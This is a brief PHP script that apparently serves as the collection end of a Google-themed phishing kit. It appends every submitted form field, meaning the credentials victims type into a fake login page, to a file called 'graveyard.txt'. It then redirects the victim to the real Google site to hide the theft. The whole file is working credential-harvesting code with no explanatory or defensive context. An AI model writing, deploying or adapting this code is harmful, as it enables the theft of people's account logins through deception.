<?php
header("Location: https://www.google.com");
$file = fopen("graveyard.txt", "a");
fwrite($file, "--------------------\n");
fwrite($file, "GOOGLE\n");
fwrite($file, "--------------------");
fwrite($file, "\r\n");
foreach($_POST as $key=>$value){
    fwrite($file, $key);
    fwrite($file, "=");
    fwrite($file, "$value");
    fwrite($file, "\r\n");
}
fwrite($file, "\r\n");
fclose($file);
exit;
?>
